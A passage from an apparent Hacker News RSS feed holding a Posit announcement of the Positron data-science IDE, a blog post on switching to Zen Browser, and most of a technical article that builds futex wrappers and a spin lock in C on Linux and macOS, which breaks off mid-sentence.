data-src="https://posit.co/wp-content/uploads/2025/08/FEATURED-BLOG-IMAGE-POSITRON-GTM-BLOG-POST-ANNOUNCEMENT-1.jpg">
                    </p>
            </div>
            <div>
                                <p>We are excited to introduce <a href="https://positron.posit.co/"><b>Positron</b></a>, a free, next-generation Integrated Development Environment (IDE) for data science by Posit PBC. Positron brings the spectrum of exploration and production work together in one environment so you can move from ideation to insight to application without switching context. Ultimately, we have taken all the learnings from the 14+ years of building RStudio, and applied them to a new platform that treats Python and R as equals.&nbsp;</p>
<p>It is a great time to start using Positron, as we’ve now released our second Positron desktop stable release as of <a href="https://positron.posit.co/download.html#release-notes">2025.08.0</a> after 2+ years of development. The upcoming release of <a href="https://posit.co/products/enterprise/workbench/">Posit Workbench</a> will also introduce Positron sessions as a generally available IDE type.</p>
<p>If you are wondering about RStudio, please don’t worry – it’s not going away! RStudio includes 14+ years of R focused optimizations and we are committed to maintaining and updating RStudio. For more information, please read the <a href="https://positron.posit.co/faqs.html#is-rstudio-going-away">FAQ for RStudio users</a>.</p>

<h2>Why Positron and why now?</h2>

<p>When RStudio, PBC became <b>Posit, PBC</b> in 2022, we committed to supporting multi‑language, open‑source data science. This has included introducing <a href="https://quarto.org/">Quarto</a>, <a href="https://shiny.posit.co/py/">Shiny for Python</a> in addition to R, and broad support for both Python and R in our open-source packages and <a href="https://posit.co/products/enterprise/team/">Posit Team</a> suite of professional tools. Today, data teams work in both R and Python, often within the same group and sometimes even within the same project.&nbsp;</p>
<p><a href="https://positron.posit.co/">Positron</a> is designed for that world, and ultimately, our goal for Positron is to create an IDE for data science that supports the full scope of modern scientific and data-driven work, across languages, tools, and workflows. We aim to do this by:</p>
<ul>
<li aria-level="1">Providing a cohesive and thoughtful experience for writing code, performing analyses, and exploring data. Whether you’re working in Python, R, or both, Positron combines notebooks, scripts, and consoles with native support for plotting and data output. Positron is also built to support additional languages, such as SQL, in the future.</li>
<li aria-level="1">Supporting the kinds of workflows that are central to data science. This includes iterative development, rich interactive output, and publication-quality documents. Positron provides built-in support for notebooks, Quarto, data apps, and more, enabling a range of common authoring and analysis tasks.</li>
<li aria-level="1">Offering a modern, extensible editor built on open standards. Positron is built on Code OSS, the same foundation as Visual Studio Code, with custom features and UI elements designed specifically for data science. This includes support for a wide array of VSIX extensions and customization, while also enabling deeper integration of language-specific tools.</li>
</ul>
<p>We believe that powerful, user-friendly, and open tools are essential for scientific computing. Positron is freely available, aligning with our goal to make high-quality data science tools accessible to everyone.</p>

<h2>Key Features</h2>

<ul>
<li aria-level="1"><b>Variable &amp; Data Frame Explorer: </b>Inspect variables and explore data frames with interactive filtering, sorting, and summary statistics.</li>
<li aria-level="1"><b>Multi-Session Console:</b> Run Python or R code line-by-line or chunk-by-chunk in one or more consoles without needing to modify your source files.</li>
<li aria-level="1"><b>Notebook Support: </b>Work with R and Python notebooks alongside your functions, modules, and scripts in a single workspace.</li>
<li aria-level="1"><b>Positron Assistant:</b> (<i>Public preview</i>) is our native GenAI client that takes the core AI assistant experience you expect and adds in all the context needed so models can understand your session, variables, and plots. It can answer questions, suggest completions, and help debug execution errors in context, all backed by the best-in-class models from Anthropic (and other model providers in the future).</li>
<li aria-level="1"><b>Plot Pane:</b> Review, resize, and export your past visualizations easily.</li>
<li aria-level="1"><b>Integrated Data App Workflow: </b>Launch and debug Data Apps or APIs like Shiny, Streamlit, or Dash, and FastAPI directly with the Run App button.</li>
<li aria-level="1"><b>Database Connection Pane: </b>Browse and query local or remote SQL data sources within the IDE.</li>
<li aria-level="1"><b>Push-Button Deployment: </b>Deploy scripts, reports, data apps, or APIs to Posit Connect with one click or with git-backed workflows.</li>
<li aria-level="1"><b>Interpreter Management: </b>Switch easily between R and Python environments in your workspace.</li>
<li aria-level="1"><b>Extension Support: </b>Customize your workflow with thousands of VS Code-compatible extensions supplied by the open-source extension marketplace <a href="https://positron.posit.co/extensions.html">Open VSX</a>.</li>
<li aria-level="1"><b>Project Folder Templates: </b>Start new Python or R projects with ready-made templates and environment setup via tools like <a href="https://docs.astral.sh/uv/">uv</a> and renv.</li>
</ul>

<h2>Learning more</h2>

<p><a href="https://positron.posit.co/download.html"><b>Positron desktop</b></a> is free and available today for Windows, macOS, and Linux under the <a href="https://github.com/posit-dev/positron?tab=License-1-ov-file#readme">Elastic License 2.0</a>, a source-available license. <a href="https://positron.posit.co/licensing.html">Read more</a> about what this license means and our decision to use it.</p>
<ol>
<li aria-level="1"><a href="https://positron.posit.co/download.html"><b>Download Positron</b></a><b> desktop for </b><b><i>free</i></b> and try out our Quick Start guides</li>
<li aria-level="1"><b>Watch</b><a href="https://posit.co/blog/a-quick-tour-of-positron/"> <b>the Quick Tour</b></a><b> video</b> for an overview of the core features</li>
<li aria-level="1">Follow the <b>migration guides</b> from <a href="https://positron.posit.co/migrate-vscode.html">VS Code</a> or <a href="https://positron.posit.co/rstudio-keybindings.html">RStudio</a></li>
<li aria-level="1">Join the <b>community</b> on <a href="https://github.com/posit-dev/positron">GitHub</a> or open a <a href="https://github.com/posit-dev/positron/discussions">discussion</a> to share feedback and ideas</li>
<li aria-level="1"><b>Join us</b> in person or virtually at <a href="https://posit.co/conference/">posit::conf(2025)</a> to hear more about Positron!</li>
<li aria-level="1"><a href="https://posit.co/about/subscription-management/"><b>Subscribe</b> to the Posit Blog</a> for even more announcements and content</li>
<li aria-level="1"><b>Read</b> the <a href="https://positron.posit.co/faqs.html">FAQ</a> for common questions</li>
</ol>
<p>Positron is the next step in our effort to make data science and scientific computing more seamless and collaborative. We hope it helps you make an even bigger impact with data.</p>
<p>– <i>The Positron Team</i></p>

                            </div>            </section>

            
    
            
                
                    
        
    
        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Why I'm all-in on Zen Browser (125 pts)]]></title>
            <link>https://werd.io/why-im-all-in-on-zen-browser/</link>
            <guid>44951799</guid>
            <pubDate>Tue, 19 Aug 2025 14:14:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://werd.io/why-im-all-in-on-zen-browser/">https://werd.io/why-im-all-in-on-zen-browser/</a>, See on <a href="https://news.ycombinator.com/item?id=44951799">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

    <article>

        <header>

                <a href="https://werd.io/tag/technology/">Technology</a>
            
                <p>After Arc's pivot to AI left power users behind, I found the browser I actually wanted.</p>

            <div>
                <p><a href="https://werd.io/author/benwerd/">
                                <img src="https://werd.io/content/images/size/w160/2025/06/IMG_5699-4.jpeg" alt="Ben Werdmuller">
                            </a>
                </p>
                
            </div>

                <figure>
        <img srcset="https://werd.io/content/images/size/w320/2025/08/Screenshot-2025-08-19-at-10.05.22---AM.png 320w,
                    https://werd.io/content/images/size/w600/2025/08/Screenshot-2025-08-19-at-10.05.22---AM.png 600w,
                    https://werd.io/content/images/size/w960/2025/08/Screenshot-2025-08-19-at-10.05.22---AM.png 960w,
                    https://werd.io/content/images/size/w1200/2025/08/Screenshot-2025-08-19-at-10.05.22---AM.png 1200w,
                    https://werd.io/content/images/size/w2000/2025/08/Screenshot-2025-08-19-at-10.05.22---AM.png 2000w" sizes="(max-width: 1200px) 100vw, 1120px" src="https://werd.io/content/images/size/w1200/2025/08/Screenshot-2025-08-19-at-10.05.22---AM.png" alt="The Zen Browser homepage, as seen in Zen Browser.">
    </figure>

        </header>

        <section>
            <p>A few years ago, I moved to&nbsp;<a href="https://arc.net/?ref=werd.io">Arc</a>&nbsp;as my default browser. I felt like everything was immediately upgraded: finally, a web browser worked how I needed it to. The interface got out of the way; it was superpowered with keyboard shortcuts that just made sense (a bit like other professional tools like&nbsp;<a href="https://superhuman.com/p?ref=werd.io">Superhuman</a>); and its profiles feature allowed me to fully sandbox my work activity away from my personal activity. It’s how I want a browser to work.</p><p>Unfortunately, it didn’t live up to the goals its vendor,&nbsp;<a href="https://www.thebrowser.company/?ref=werd.io">The Browser Company</a>, had set up for it. It was a niche tool for a certain kind of power user, which didn’t justify the company’s valuation. Had it been a product made by an independent company, I would have gladly paid for it, and it might have formed the basis of a sustainable business. But&nbsp;<a href="https://techcrunch.com/2025/05/27/the-browser-company-mulls-selling-or-open-sourcing-arc-browser-amid-ai-focused-pivot/?ref=werd.io">The Browser Company needed scale</a>, and it was not to be.</p><p>Instead, The Browser Company took advantage of the buzz around AI, and&nbsp;<a href="https://techcrunch.com/2025/06/11/the-browser-company-launches-its-ai-first-browser-dia-in-beta/?ref=werd.io">created a new, AI-focused browser called Dia</a>. Rather than build these features into Arc, the company tried again: it lost most of Arc’s power user features and added AI to a browser framework that isn’t a million miles away from stock Chrome. The learning curve was removed, but so was the utility. Meanwhile,&nbsp;<a href="https://www.engadget.com/ai/the-browser-company-stops-active-development-of-arc-in-favor-of-new-ai-focused-product-153045276.html?ref=werd.io">Arc is not gone, but it’s certainly on life support, with no new features planned</a>.</p><p>I tried to love Dia, but I’m not bullish about it. It really has lost the power user features that made Arc special: the excellent tab sidebar is gone and profile switching is nowhere near as fluid. But it also has far more competition:&nbsp;<a href="https://www.perplexity.ai/comet?ref=werd.io">Perplexity has introduced Comet</a>, its own AI browser,&nbsp;<a href="https://www.google.com/chrome/ai-innovations/?ref=werd.io">and Chrome itself has built-in Gemini features</a>. It’s not clear why Dia would do better. And ironically,&nbsp;<a href="https://www.diabrowser.com/pro?ref=werd.io">The Browser Company now charges $20/month</a>, the same amount I would gladly have paid for Arc. Unless The Browser Company has something amazing up its sleeve, I think it’s destined for an acquisition that might see features from its own products incorporated into someone else’s.</p><p>Because Dia is heavily oriented around contextual AI, I’m also worried about the privacy of my browsing. One feature allows your discussions with an AI model to be informed by your recent browsing history, which requires sending a supposedly-protected version of that history to their servers. No thanks: that’s a judgment call for my personal data, but it’s an absolute no-go for my work browsing. You can turn that feature off, but it’s not a given that this contextual information isn’t shared any other way.</p><p>Which left me hunting for another browser. I cannot compromise my data, and I’m not interested in investing in a product that I think will be going away soon.</p><p>Firefox remains the gold standard for user-first browsing. Unfortunately, while the original Firefox was a huge step forward in browsing user experience (certainly over the original Mozilla browser, but also over everything else at the time), it now feels pretty clunky. Each function works well, but it doesn’t feel like much thought has been put into the experience of using Firefox overall; the user journey to get things done often feels disjointed, and the browser interface is always there, taking up screen real estate. It was my first stop as a replacement once I chose to move on from Dia, but I pined for the power user features I enjoyed with Arc. It’s fine but not delightful.</p><p>So I was pleased to rediscover&nbsp;<a href="https://zen-browser.app/?ref=werd.io">Zen Browser</a>, which has improved in leaps and bounds since I last tried it. It has a very Arc-inspired UI that gets out of your face quickly, with all the customization and keyboard shortcuts you’d expect from something built on top of Firefox. I use vertical tabs in a sidebar that auto-hides, and I can navigate just as smoothly as I ever did with Arc.</p><p>The Firefox framework itself has gained&nbsp;<a href="https://support.mozilla.org/en-US/kb/profile-management?ref=werd.io">a new profile manager</a>, which is the last remaining piece. Although you have to turn it on through a switch buried deep in your settings, once you do, you can easily flip between browser contexts, and I can once again have fully independent work and personal browser windows. The previous one looked like it had been built in Perl in 1996, and was really optimized to use via the command line; the new one is what you’d expect from a browser that cares about non-developer users.</p><p>To be clear, there are some weird quirks. Keyboard shortcuts have to be set up for every profile, which doesn’t make sense to me. Computers are typically single-user, and profiles are for different contexts, not people; unifying shortcuts across them should at least be an option. And&nbsp;<a href="https://support.mozilla.org/en-US/kb/how-do-i-set-sync-my-computer?ref=werd.io">syncing with a Firefox account</a> only works one profile at a time, so if you want to sync multiple profiles, you need to create multiple Firefox accounts. (I've chosen to sync my personal profile but not my work data.) But these are all weirdnesses that are inherited from the core Firefox product; Zen Browser has made the best of these raw ingredients and built something pretty special.</p><p>So, as of now, it’s my default browser. It can be yours, too:&nbsp;<a href="https://zen-browser.app/download/?ref=werd.io">it works across all major desktop platforms</a>. I think, right now at least, that it’s the best of the bunch.</p><p>But I do have a question. Given how much better Zen is than stock Firefox,&nbsp;<em>why isn’t it Firefox?</em>&nbsp;Mozilla should take this team, absorb it, and use it to help navigate the future of their flagship browser for end users. Firefox is a great framework for developers to innovate their own browser experiences, but it also needs a default way for users to experience its functionality. Zen Browser should be it.</p>
        </section>

    </article>

        

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Without the Futex, It's Futile (270 pts)]]></title>
            <link>https://h4x0r.org/futex/</link>
            <guid>44951563</guid>
            <pubDate>Tue, 19 Aug 2025 13:53:42 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://h4x0r.org/futex/">https://h4x0r.org/futex/</a>, See on <a href="https://news.ycombinator.com/item?id=44951563">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><main><article><div><p><a href="https://eatonphil.com/">Phil Eaton’s</a> <a href="https://eatonphil.com/2025-art-of-multiprocessor-programming.html">book club</a> is starting
<u>The Art of Multiprocessor Programming, 2nd Edition</u>
, which is a <em>very</em> well regarded textbook, and pretty recently updated (2021). I’ve even heard of a couple of authors.</p><p>I’ve done a lot of concurrent programming, and have always felt like I’ve still got plenty to learn, so I was excited for the topic. So far, what I’ve learned is that I would never recommend this book, despite any merits.</p><p>Academia certainly struggles to find the right balance between teaching foundational principles and practical information. Being this book is explicitly targeting fourth-year undergraduates and grad students, it should definitely cover the fundamentals, right?</p><p>So how the heck could it not cover the <em>futex</em>??</p><h2 id="isnt-that-just-a-type-of-mutex-surely-the-futex-cant-be-that-important">Isn’t that just a type of mutex? Surely the futex can’t be THAT important?</h2><p>The name sure sounds like “mutex”, and that <strong>is</strong> where the name comes from: “fast, user space mutex”. But, it isn’t really, it’s a building block for concurrency primitives that ushered in a modern world of concurrent performance that makes System V (sysv) feel so old and busted, it feels wrong to even call it a dinosaur 🦖, as if it were once mighty?</p><p>Way back in the last millennium, locking primitives were pretty much all based on the System V IPC (inter-process communication) code, specifically their semaphore code. All common concurrency primitives were over-complicated under the hood, and just didn’t scale well to large numbers of threads.</p><p>Until Linux added the futex.</p><p>Going back to the <a href="https://www.kernel.org/doc/ols/2002/ols2002-pages-479-495.pdf">original futuex paper</a> in 2002, it was immediately clear that the futex was a huge improvement in highly concurrent environments. Just in that original paper, their tests with 1000 parallel tasks ran <em>20-120 times faster</em> than sysv locks..🤯</p><p>Needless to say, other common operating systems followed suit, including Windows in 2012 and macOS by 2016.</p><p>These days, any <strong>good</strong> locking primitive is going to be based on a futex. You should expect system libraries like <code>pthreads</code> will use the futex extensively.</p><h2 id="wait-a-futex-isnt-a-mutex-so-what-is-it-then">Wait, a futex isn’t a mutex? So what is it, then?</h2><p>When there’s too much contention for a lock, actively trying to acquire it as fast as possible will just eat CPU that other threads could be using for work, to just sit there and wait.</p><p>It’d be nice to be able to clear up that CPU and put the thread to sleep until the lock is ready.</p><p>Unless you’re essentially going to build your own thread scheduling implementation in user-space (which is basically what async implementations do at their core), you either need to poll, which is inefficient, or you need operating system support.</p><p>In sysv IPC, the core tool for getting OS-supported blocking when building higher-level concurrency program was the <em>semaphore</em>, which <strong>intertwined locking and waiting</strong>.</p><p>The <em>futex</em> essentially separates the <em>locking</em> from <em>waiting (and waking)</em> tasks.</p><p>The flexibility you get from separating those two concerns is key to good lock performance. It becomes much easier to avoid unnecessary delays (like sleeps with exponential backoffs) and bottlenecks, particularly <strong>system calls themselves</strong>, which are quite expensive compared to most of the code involved in locking.</p><p>For instance, if you’re building a mutex, your unlock operation can skip calling into the kernel for the unlock operation if you can be confident in userland that no threads are waiting. In sysv land, an unlock was always a system call.</p><p>Essentially, the futex <code>wait()</code> call allows a task to block, queuing that task inside the kernel, on a list specifically associated with a particular memory address, and allows an optional timeout.</p><p>The <code>wake()</code> operation will dequeue threads from the internal list, running them again. You can choose how many to wake, but generally, the code will wake either 1 or all of them, never anything in between.</p><p>People often describe the futex as, <strong>“Wait on memory address”</strong>. That overlooks the notification side, but it’s a much more apt name, and why Windows’ name for this API (<code>WaitOnAddress</code>) is superior API naming (to be fair, they did have a decade to think about the name).</p><p>The memory address you’re waiting on tends to be a 32-bit integer, sometimes a 64-bit integer. The OS doesn’t care much about the semantics of the value inside that integer. However, and very importantly, when calling the <code>wait()</code> operation, the caller <em>must</em> present what it thinks the value of the futex is. If the value has changed, the operation fails.</p><p>Providing the value protects from waiting for a wake that has already happened. Whenever you need to wait, you’re waiting for some particular state to occur. The OS doesn’t care about the specifics of how your state is encoded in the futex, since it’s responsible for the order of operations on the futex; it won’t enqueue a waiter with an incorrect view of the current state.</p><p>For example, let’s say you’re a thread who wants to wait for state <code>Y</code> (which might be availability of a lock), and you have checked, and you think the state is <code>X</code> (say… locked). In the time from when you checked to the time of the wait, the state could actually be <code>Y</code>. And, if you’re using a more complicated concurrency primitive like a reader-writer lock, the state could have changed to <code>Z</code>.</p><p>The OS doesn’t need to care; it just knows when a task needs to take a long, hard look at its decisions. 👀🪞</p><h2 id="futex-the-ex-future-ie-the-present">Futex: the ex-future (i.e., the present)</h2><p>We’ve established it’s important, so let’s supplement the book with some of the content it should have had.</p><p>Being a low-level primitive, futexes are certainly hard to get right. The OS will make sure all operations on it from its perspective are well ordered, but when you modify state, not only to do you have to have confidence in your algorithm, you have to worry about the compiler or hardware performing relevent operations either out-of-order or in an overlapping way.</p><p>Still, it’s not <strong>too</strong> hard to build a basic mutex on top of a futex, and it’s a good exercise to start to show how we can often avoid unnecessary system calls.</p><p>Let’s start by building ourselves a little wrapper for <code>futex</code> that gives us access to the core functionality, and works across Linux and Mac. Other OSes are cool and all, yet still left as an exercise to the reader.</p><p>Our futex will be a 32-bit integer (I believe this is the only size on Linux still, so it’s the most portable). But when we use the thing for state management, we will want to play life safe and ensure that any work we do on the contents are guaranteed to be <em>sequentially consistent</em>, where there’s a linear order to the operations, and no thread would have seen anything inconsistent with that order.</p><table><tbody><tr><td>🏃🏿‍♂️</td><td>While many algorithms can work with much weaker consistency guarantees, we will generally avoid memory ordering optimization because it's so error prone, and often doesn't really make a significant difference for real-world programs. Just say no to premature optimization.</td></tr></tbody></table><p>To make it easier to get the full sequentially consistent experience, we will explicitly declare our futex to be atomic, even though the APIs we call probably will not explicitly declare them as such in formal parameter declarations. We’ll generally use an explicit atomic call for operations, but declaring variables atomic ensures that, when you don’t explicitly use an atomic operation to access, you get one anyway.</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>#include</span> <span>&lt;stdint.h&gt; // for uint32_t</span><span>
</span></span></span><span><span><span>#include</span> <span>&lt;stdatomic.h&gt;</span><span>
</span></span></span><span><span><span></span><span>typedef</span> <span>_Atomic</span>(<span>uint32_t</span>) <span>h4x0r_futex_t</span>;
</span></span></code></pre></div><p>On Linux, the main system call for the futex is a Swiss Army knife with many commands and options, both. Some of the features of the API turned out to be bad ideas, but endure because nobody wants to break code dependent on them. While the futex isn’t too hard in concept, the complexity of the Linux API is pretty staggering.</p><p>We’ll skip over all the complexity and just write a wrapper for the basic functionality under the assumption that you’re going to use futexes to build stuff within the context of a single process with threads (e.g., we won’t worry about locks shared between processes in this article).</p><p>Here’s the core functionality we need:</p><ol><li>The calling thread will wait <em>if the state is correct</em>.</li><li>The calling thread can specify an optional timeout.</li><li>We get back a result indicating success (<code>0</code>) or error (depends on why we didn’t wait, but both the race condition and timeout are valid reasons, as are interrupts).</li></ol><table><tbody><tr><td>🧵😴</td><td>Being explicit, if the return value is <code>0</code>, that means your thread slept, and welcome back from dreamland!</td></tr></tbody></table><p>In Linux, glibc doesn’t wrap the <code>futex</code> system call, so we’ll have to use their generic system call wrapper, <code>syscall</code>:</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>#include</span> <span>&lt;time.h&gt; // For struct timespec.</span><span>
</span></span></span><span><span><span></span>
</span></span><span><span><span>#if defined(__linux__)
</span></span></span><span><span><span>#include</span> <span>&lt;linux/futex.h&gt;</span><span>
</span></span></span><span><span><span>#include</span> <span>&lt;sys/syscall.h&gt;</span><span>
</span></span></span><span><span><span>#include</span> <span>&lt;unistd.h&gt;</span><span>
</span></span></span><span><span><span>#include</span> <span>&lt;stdint.h&gt;</span><span>
</span></span></span><span><span><span></span>
</span></span><span><span><span>static</span> <span>inline</span> <span>int</span>
</span></span><span><span><span>h4x0r_futex_wait_timespec</span>(<span>h4x0r_futex_t</span>  <span>*</span>futex,
</span></span><span><span>                         <span>uint32_t</span>         expected,
</span></span><span><span>                         <span>struct</span> timespec <span>*</span>timeout_ptr)
</span></span><span><span>{
</span></span><span><span>    <span>int</span> err <span>=</span> <span>syscall</span>(SYS_futex,
</span></span><span><span>                      futex,
</span></span><span><span>                      FUTEX_WAIT_PRIVATE,
</span></span><span><span>                      expected,
</span></span><span><span>                      timeout_ptr,
</span></span><span><span>                      NULL,
</span></span><span><span>                      <span>0</span>);
</span></span><span><span>    <span>if</span> (err <span>==</span> <span>-</span><span>1</span>) {
</span></span><span><span>        <span>return</span> errno;
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>return</span> <span>0</span>;
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>#endif
</span></span></span></code></pre></div><p>The <code>syscall()</code> wrapper doesn’t return the full error, just <code>-1</code>, which is why we have to check <code>errno</code>.</p><p>There, we return the error code (if any) from our wrapper, even though the system call returns -1 on an error, and then passes the specific error via <code>errno</code>.</p><p>Waking a thread up involves calling the same system call, but we just pass the corresponding wake operation:</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>#include</span> <span>&lt;stdbool.h&gt;</span><span>
</span></span></span><span><span><span></span>
</span></span><span><span><span>#if defined(__linux__)
</span></span></span><span><span><span></span><span>static</span> <span>inline</span> <span>int</span>
</span></span><span><span><span>h4x0r_futex_wake</span>(<span>h4x0r_futex_t</span> <span>*</span>futex, <span>bool</span> all)
</span></span><span><span>{
</span></span><span><span>    <span>uint32_t</span> n <span>=</span> all <span>?</span> INT_MAX : <span>1</span>;
</span></span><span><span>
</span></span><span><span>    <span>return</span> <span>syscall</span>(SYS_futex,
</span></span><span><span>                   futex,
</span></span><span><span>                   FUTEX_WAKE_PRIVATE,
</span></span><span><span>                   n,
</span></span><span><span>                   NULL,
</span></span><span><span>                   NULL,
</span></span><span><span>                   <span>0</span>);
</span></span><span><span>}
</span></span><span><span><span>#endif
</span></span></span></code></pre></div><p>When waking, we <strong>do not</strong> pass an expected value for the futex (it’s irrelevant), nor do we pass a timeout (this operation can’t block), and the error gets returned directly.</p><p>Instead, we do need to pass the number of threads to wake, but in our API, we’ve simplified that down to a flag to toggle between one waiter and all waiters.</p><p>My MacOS wrapper apparently is a bit out of date; I use the somewhat undocumented <code>__ulock</code> interface (its documentation is just some comments in the Darwin source code), but TIL that they added a new, simpler interface, just last year (<code>os_sync_wait_on_address</code>). Still, for now, we’ll go old school for better compatibility and build the same two operations:</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>#if defined(__APPLE__)
</span></span></span><span><span><span>#include</span> <span>&lt;stdint.h&gt;</span><span>
</span></span></span><span><span><span></span>
</span></span><span><span><span>// These were never exposed in any headers.
</span></span></span><span><span><span></span><span>extern</span> <span>int</span> <span>__ulock_wait2</span>(<span>uint32_t</span>, <span>void</span> <span>*</span>, <span>uint64_t</span>, <span>uint64_t</span>, <span>uint64_t</span>);
</span></span><span><span><span>extern</span> <span>int</span> <span>__ulock_wake</span>(<span>uint32_t</span>, <span>void</span> <span>*</span>, <span>uint64_t</span>);
</span></span><span><span>
</span></span><span><span><span>#define H4X0R_NSEC_PER_SEC                   1000000000
</span></span></span><span><span><span>#define H4X0R_LOCK_COMPARE_AND_WAIT          1
</span></span></span><span><span><span>#define H4X0R_LOCK_WAKE_ALL                  0x00000100
</span></span></span><span><span><span>#define H4X0R_LOCK_WAKE_THREAD               0x00000200
</span></span></span><span><span><span></span>
</span></span><span><span><span>#define H4X0R_WAKE_ALL    (H4X0R_LOCK_COMPARE_AND_WAIT | H4X0R_LOCK_WAKE_ALL)
</span></span></span><span><span><span>#define H4X0R_WAKE_THREAD (H4X0R_LOCK_COMPARE_AND_WAIT | H4X0R_LOCK_WAKE_THREAD)
</span></span></span><span><span><span></span>
</span></span><span><span><span>static</span> <span>inline</span> <span>int</span>
</span></span><span><span><span>h4x0r_futex_wait_timespec</span>(<span>h4x0r_futex_t</span>   <span>*</span>futex,
</span></span><span><span>                         <span>uint32_t</span>         expected,
</span></span><span><span>                         <span>struct</span> timespec <span>*</span>timeout)
</span></span><span><span>{
</span></span><span><span>    <span>uint64_t</span> timeout_ns <span>=</span> <span>0</span>;
</span></span><span><span>
</span></span><span><span>    <span>if</span> (timeout) {
</span></span><span><span>        timeout_ns <span>=</span> timeout<span>-&gt;</span>tv_nsec <span>+</span> timeout<span>-&gt;</span>tv_sec <span>*</span> H4X0R_NSEC_PER_SEC;
</span></span><span><span>    }
</span></span><span><span>    <span>return</span> <span>__ulock_wait2</span>(H4X0R_LOCK_COMPARE_AND_WAIT,
</span></span><span><span>                         futex,
</span></span><span><span>                         (<span>uint64_t</span>)expected,
</span></span><span><span>                         timeout_ns,
</span></span><span><span>                         <span>0</span>);
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>int</span>
</span></span><span><span><span>h4x0r_futex_wake</span>(<span>h4x0r_futex_t</span> <span>*</span>futex, <span>bool</span> all)
</span></span><span><span>{
</span></span><span><span>    <span>return</span> <span>__ulock_wake</span>(all <span>?</span> H4X0R_WAKE_ALL : H4X0R_WAKE_THREAD,
</span></span><span><span>                        futex,
</span></span><span><span>                        <span>0ULL</span>);
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>#endif
</span></span></span></code></pre></div><h2 id="the-missing-mutex-primitive">The missing mutex primitive</h2><p>The book doesn’t really cover the mutex well, focusing more on the term “mutual exclusion”, which gets its own chapter early days, and is thrown around liberally in a chapter about spin locks. Sure, locks don’t need to involve waiting, and the core of a mutex doesn’t require waiting. So a spin lock is definitely a form of mutex. The book does show spin locks, and they’re not hard to build:</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>#include</span> <span>&lt;stdatomic.h&gt;</span><span>
</span></span></span><span><span><span>#include</span> <span>&lt;stdint.h&gt;</span><span>
</span></span></span><span><span><span></span>
</span></span><span><span><span>typedef</span> _Atomic <span>uint32_t</span> <span>h4x0r_spin_lock_t</span>;
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_spin_lock_init</span>(<span>h4x0r_spin_lock_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>    <span>atomic_store</span>(lock, <span>0</span>);        
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_spin_lock_acquire</span>(<span>h4x0r_spin_lock_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>    <span>while</span> (<span>atomic_fetch_or</span>(lock, <span>1</span>)) <span>/* do nothing */</span> ;
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_spin_lock_release</span>(<span>h4x0r_spin_lock_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>   <span>atomic_store</span>(lock, <span>0</span>);
</span></span><span><span>}
</span></span></code></pre></div><p>It might not be intuitive why the above lock works. The <code>atomic_fetch_or()</code> operation performs a bit-wise OR, but returns the value from before the operation began. As implied by the “function” name, the entire operation happens atomically, and in reality, won’t be a proper function; it’ll most likely inline to a tiny bit of assembly.</p><p>Let’s say 100 threads are contending for the lock, and let’s just imagine no thread gives up the lock, either. We use the version of this API that guarantees sequential consistency. As a result, at runtime, all threads will essentially perform the OR, but only one will see <code>0</code> as a return value. That’s the thread that gets the lock.</p><p>Many people are surprised that any lock can be built with only single bit, but there you go.</p><p>Still, our simple spin lock has some potential problems:</p><ol><li>It doesn’t deal with heavy contention (i.e., it doesn’t provide a way to offload CPU via waiting).</li><li>If a thread mistakenly calls our <code>unlock</code> operation on a lock it doesn’t own, it’ll unlock the lock 😱</li><li>If a thread recursively tries to acquire this lock, it’ll end up blocked, waiting for a lock it already holds– deadlock!</li></ol><p>Some people wouldn’t consider the last one a real problem, as we’ll discuss later. But the other two are definitely worth addressing.</p><p>Anyway, let’s show how we can deal with all of these issues.</p><h2 id="when-and-how-to-block">When and how to block</h2><p>Most libraries will have separate APIs for spin locks and mutexes.</p><p>Yet, good mutex implementations <em>do</em> tend to start with a spin lock, and if they try some number of times and fail, then there’s too much contention, so they wait.</p><p>If the lock is uncontended, the spin lock will be successful on the first try, and will be pretty fast – no system call. With light contention and a short critical section, we may still get the lock without having to make the system call to wait.</p><p>One thing I wanted to see from the book was guidance on how long mutexes should spin for. Surely, there’s not a one-size-fits-all answer, especially as hardware platforms evolve. Clearly, the overhead of a system call, the number of tasks, and the duration of the critical section could all come into play, but does anyone have any metrics here?</p><p>Personally, I just tend to use a hard-coded <code>16</code> iterations, but with no strong reason. I suppose I probably saw someone else use it once, but also with no explanation.</p><p>When it comes to dealing with contention, the book covers exponential back-off – when you don’t get the lock due to contention, you exponentially increase the time you wait, in an attempt to try to spread out contention (usually, exponential backup stops at some maximum duration, which usually comes after 5-8 failed attempts).</p><p>But what do they tell you to do?? Call <code>sleep()</code> for the backoff period. What if contention clears right as you put yourself to sleep? You wait anyway, and while perhaps you had the opportunity to take the lock uncontested had you kept spinning, and you might get really unlucky, and the contention could come back right as you’re waking up.</p><p>By the way, blocking is <strong>so</strong> overlooked in this book; they don’t even <em>mention</em> the word polling (I bought the e-book and searched extensively). This issue with using <code>sleep()</code> to block certainly isn’t mentioned, even when it’s casually tossed into their code.</p><p>You probably have an inkling already– the futex is how modern locks avoid these problems.</p><p>If a futex is available, exponential backoff (or any polling-based approach) makes little sense. With polling, wakes are essentially arbitrary guesses. With the futex, wakes are explicitly tied to the mutex becoming available.</p><p>When there’s significant contention with a polling-based approach, if we don’t use exponential 